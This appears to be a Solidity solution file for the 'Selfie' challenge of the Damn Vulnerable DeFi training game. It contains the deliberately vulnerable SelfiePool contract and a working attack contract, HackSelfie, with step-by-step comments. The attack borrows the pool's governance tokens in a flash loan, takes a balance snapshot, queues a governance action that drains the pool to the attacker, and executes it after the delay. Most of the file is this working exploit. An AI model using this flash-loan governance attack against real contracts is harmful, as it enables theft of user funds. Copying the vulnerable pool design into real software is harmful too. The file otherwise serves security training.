// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}

import "../DamnValuableTokenSnapshot.sol";

contract HackSelfie {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public gov;

    uint public actionId;

    constructor(address _token, address _pool, address _gov) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }
    
    fallback() external {
        // STEP 2 - snapshot our current balance and return the loan to the pool
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    /** EXPLOIT - We can submit a proposal to drain all funds if we use a flash loan to get enough votes. 
        We need to wait two days to execute the proposal, but the governance has no method to cancel queued proposals, so it is inevitable. */
    function attack() external {
        // STEP 1 - flash loan to get all tokens available at the pool
        pool.flashLoan(token.balanceOf(address(pool)));
        // STEP 3 - submit a proposal to drain all funds. We have enough votes to pass the proposal because the last snapshot was taken when we had the loan balance
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    function attack2() external {
        // STEP 4 - execute action after waiting the delay time. 
        gov.executeAction(actionId);
    }
}
